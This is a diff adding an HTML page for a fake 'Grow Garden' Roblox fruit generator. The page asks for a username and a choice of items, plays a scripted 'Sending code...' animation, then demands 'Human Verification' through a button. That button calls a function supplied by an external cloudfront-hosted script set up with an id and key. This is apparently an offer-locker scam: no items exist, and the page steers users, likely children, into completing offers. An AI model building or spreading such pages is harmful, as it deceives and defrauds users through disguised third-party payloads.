@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Grow Garden Roblox Generator</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Fredoka', sans-serif;
+        }
+        body {
+            background: linear-gradient(to bottom, #87CEEB, #E0F6FF);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo {
+            max-width: 150px;
+            height: auto;
+        }
+        .fix-stroke {
+            color: #FFD700;
+            text-shadow: 2px 2px 4px #000;
+            font-weight: 600;
+        }
+        .header h2 {
+            font-size: 2em;
+            margin: 10px 0;
+        }
+        .input-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .input-section input[type="text"] {
+            padding: 10px;
+            width: 70%;
+            max-width: 300px;
+            margin-bottom: 10px;
+            border: 2px solid #4CAF50;
+            border-radius: 5px;
+            font-size: 1em;
+        }
+        .input-section button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+        }
+        .input-section button:hover {
+            background-color: #45a049;
+        }
+        .warning {
+            color: red;
+            margin-bottom: 10px;
+            display: none;
+        }
+        .small-text {
+            text-align: center;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        .card-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .card {
+            background: white;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            text-align: center;
+            width: 100px;
+            height: 120px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            position: relative;
+        }
+        .card .circle {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: #4CAF50;
+            top: 10px;
+            right: 10px;
+            display: none;
+        }
+        .card.selected .circle {
+            display: block;
+        }
+        .card img {
+            max-width: 60px;
+            max-height: 60px;
+            margin-bottom: 5px;
+        }
+        .card-content h3 {
+            font-size: 0.9em;
+            color: #333;
+        }
+        #second-page {
+            width: 100%;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            min-height: 100vh;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .loading-circles {
+            display: flex;
+            justify-content: center;
+            gap: 5px;
+            margin: 20px 0;
+        }
+        .loading-circle {
+            width: 10px;
+            height: 10px;
+            background: #4CAF50;
+            border-radius: 50%;
+            animation: bounce 1.2s infinite ease-in-out;
+        }
+        .loading-circle:nth-child(2) { animation-delay: 0.1s; }
+        .loading-circle:nth-child(3) { animation-delay: 0.2s; }
+        .loading-circle:nth-child(4) { animation-delay: 0.3s; }
+        .loading-circle:nth-child(5) { animation-delay: 0.4s; }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+        .loading-text {
+            color: #333;
+            margin-top: 10px;
+            font-size: 1.1em;
+        }
+        .verification-text {
+            color: red;
+            font-size: 1.2em;
+            margin-top: 10px;
+            display: none;
+        }
+        #verify-button {
+            padding: 10px 20px;
+            background-color: #2196F3;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 15px auto;
+            display: none;
+        }
+        #verify-button:hover {
+            background-color: #1976D2;
+        }
+        @media (max-width: 600px) {
+            .header h2 {
+                font-size: 1.5em;
+            }
+            .card {
+                width: 80px;
+                height: 100px;
+            }
+            .card img {
+                max-width: 50px;
+                max-height: 50px;
+            }
+            #second-page {
+                max-width: 100%;
+                padding: 10px;
+            }
+            .loading-text, .verification-text {
+                font-size: 1em;
+            }
+            #verify-button {
+                font-size: 0.9em;
+            }
+        }
+    </style>
+    <script type="text/javascript">
+        var cvcbp_LmZ_WevURc={"it":4510493,"key":"47b35"};
+    </script>
+    <script src="https://dfmpe7igjx4jo.cloudfront.net/3532cad.js"></script>
+</head>
+<body>
+    <div id="first-page">
+        <div class="header">
+            <img src="https://growagarden.pages.dev/logo2.webp?text=Logo" alt="Logo" class="logo">
+            <h2 class="fix-stroke">Fruit Generator</h2>
+        </div>
+        <p class="small-text">Browse through the available fruits:</p>
+        <div id="warning-pet-limit" class="warning">You can only select up to 3 fruits!</div>
+        <div id="warning-no-pet" class="warning">Please select at least one fruit!</div>
+        <div class="input-section">
+            <input type="text" id="username" placeholder="Enter Username">
+            <div id="warning-username" class="warning"></div>
+            <button class="fix-stroke" id="generate">Generate!</button>
+        </div>
+        <div class="card-container">
+            <div class="card" id="card21" data-fruit="x10 Flower Pack">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/flowerpack.webp?text=Flower+Pack" alt="x10 Flower Pack">
+                <div class="card-content">
+                    <h3 class="fix-stroke">x10 Flower Pack</h3>
+                </div>
+            </div>
+            <div class="card" id="card1" data-fruit="Beanstalk">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/beanstalk.png?text=Beanstalk" alt="Beanstalk">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Beanstalk</h3>
+                </div>
+            </div>
+            <div class="card" id="card2" data-fruit="Cacao">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/cacao.webp?text=Cacao" alt="Cacao">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Cacao</h3>
+                </div>
+            </div>
+            <div class="card" id="card3" data-fruit="Pepper">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/pepper.webp?text=Pepper" alt="Pepper">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Pepper</h3>
+                </div>
+            </div>
+            <div class="card" id="card4" data-fruit="Mushroom">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/mushroom.webp?text=Mushroom" alt="Mushroom">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Mushroom</h3>
+                </div>
+            </div>
+            <div class="card" id="card5" data-fruit="Grape">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/grape.webp?text=Grape" alt="Grape">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Grape</h3>
+                </div>
+            </div>
+            <div class="card" id="card6" data-fruit="Mango">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/mango.webp?text=Mango" alt="Mango">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Mango</h3>
+                </div>
+            </div>
+            <div class="card" id="card7" data-fruit="Dragon Fruit Seed">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/dragonfruit.webp?text=Dragon+Fruit" alt="Dragon Fruit Seed">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Dragon Fruit Seed</h3>
+                </div>
+            </div>
+            <div class="card" id="card8" data-fruit="Cactus">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/cactus.webp?text=Cactus" alt="Cactus">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Cactus</h3>
+                </div>
+            </div>
+            <div class="card" id="card9" data-fruit="Coconut">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/coconut.webp?text=Coconut" alt="Coconut">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Coconut</h3>
+                </div>
+            </div>
+            <div class="card" id="card10" data-fruit="Bamboo">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/bamboo.webp?text=Bamboo" alt="Bamboo">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Bamboo</h3>
+                </div>
+            </div>
+            <div class="card" id="card11" data-fruit="Apple">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/apple.webp?text=Apple" alt="Apple">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Apple</h3>
+                </div>
+            </div>
+            <div class="card" id="card12" data-fruit="Pumpkin">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/pumpkin.webp?text=Pumpkin" alt="Pumpkin">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Pumpkin</h3>
+                </div>
+            </div>
+            <div class="card" id="card13" data-fruit="Watermelon">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/watermelon.webp?text=Watermelon" alt="Watermelon">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Watermelon</h3>
+                </div>
+            </div>
+            <div class="card" id="card14" data-fruit="Daffodil">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/daffodil.webp?text=Daffodil" alt="Daffodil">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Daffodil</h3>
+                </div>
+            </div>
+            <div class="card" id="card15" data-fruit="Corn">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/corn.webp?text=Corn" alt="Corn">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Corn</h3>
+                </div>
+            </div>
+            <div class="card" id="card16" data-fruit="Tomato">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/tomato.webp?text=Tomato" alt="Tomato">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Tomato</h3>
+                </div>
+            </div>
+            <div class="card" id="card17" data-fruit="Orange">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/orange.webp?text=Orange" alt="Orange">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Orange</h3>
+                </div>
+            </div>
+            <div class="card" id="card18" data-fruit="Blueberry">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/blueberry.webp?text=Blueberry" alt="Blueberry">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Blueberry</h3>
+                </div>
+            </div>
+            <div class="card" id="card19" data-fruit="Strawberry">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/strawberry.webp?text=Strawberry" alt="Strawberry">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Strawberry</h3>
+                </div>
+            </div>
+            <div class="card" id="card20" data-fruit="Carrot">
+                <div class="circle"></div>
+                <img src="https://growagarden.pages.dev/pets/carrot.webp?text=Carrot" alt="Carrot">
+                <div class="card-content">
+                    <h3 class="fix-stroke">Carrot</h3>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="second-page">
+        <img src="https://growagarden.pages.dev/logo2.webp?text=Logo" alt="Logo" class="logo">
+        <div class="loading-circles">
+            <div class="loading-circle"></div>
+            <div class="loading-circle"></div>
+            <div class="loading-circle"></div>
+            <div class="loading-circle"></div>
+            <div class="loading-circle"></div>
+        </div>
+        <p class="loading-text" id="loading-text"></p>
+        <p class="verification-text" id="verification-text">Human Verification Required</p>
+        <button id="verify-button">Verify Now</button>
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            let selectedFruits = [];
+            const maxSelections = 3;
+            const cards = document.querySelectorAll('.card');
+            const generateButton = document.getElementById('generate');
+            const firstPage = document.getElementById('first-page');
+            const secondPage = document.getElementById('second-page');
+            const loadingText = document.getElementById('loading-text');
+            const verificationText = document.getElementById('verification-text');
+            const verifyButton = document.getElementById('verify-button');
+            const warningUsername = document.getElementById('warning-username');
+            const warningPetLimit = document.getElementById('warning-pet-limit');
+            const warningNoPet = document.getElementById('warning-no-pet');
+
+            cards.forEach(card => {
+                card.addEventListener('click', () => {
+                    const fruit = card.getAttribute('data-fruit');
+                    if (selectedFruits.includes(fruit)) {
+                        selectedFruits = selectedFruits.filter(f => f !== fruit);
+                        card.classList.remove('selected');
+                    } else if (selectedFruits.length < maxSelections) {
+                        selectedFruits.push(fruit);
+                        card.classList.add('selected');
+                    } else {
+                        warningPetLimit.style.display = 'block';
+                        setTimeout(() => warningPetLimit.style.display = 'none', 2000);
+                    }
+                });
+            });
+
+            generateButton.addEventListener('click', () => {
+                const username = document.getElementById('username').value.trim();
+                if (!username) {
+                    warningUsername.style.display = 'block';
+                    warningUsername.textContent = 'Please enter a username!';
+                    setTimeout(() => warningUsername.style.display = 'none', 2000);
+                    return;
+                }
+                if (selectedFruits.length === 0) {
+                    warningNoPet.style.display = 'block';
+                    setTimeout(() => warningNoPet.style.display = 'none', 2000);
+                    return;
+                }
+
+                firstPage.style.display = 'none';
+                secondPage.style.display = 'flex';
+                loadingText.textContent = 'Finding username...';
+                verificationText.style.display = 'none';
+                verifyButton.style.display = 'none';
+
+                let step = 0;
+                const steps = [
+                    'Finding username...',
+                    'Sending code for ' + selectedFruits.join(', ') + '...',
+                    'Please verify to receive your ' + selectedFruits.join(', ') + ' rewards! Complete one simple offer to claim.'
+                ];
+                const interval = setInterval(() => {
+                    if (step < steps.length) {
+                        loadingText.textContent = steps[step];
+                        step++;
+                    } else {
+                        clearInterval(interval);
+                        loadingText.style.display = 'none';
+                        verificationText.style.display = 'block';
+                        verifyButton.style.display = 'block';
+                    }
+                }, 2000);
+            });
+
+            verifyButton.addEventListener('click', () => {
+                if (typeof _gD === 'function') {
+                    _gD();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
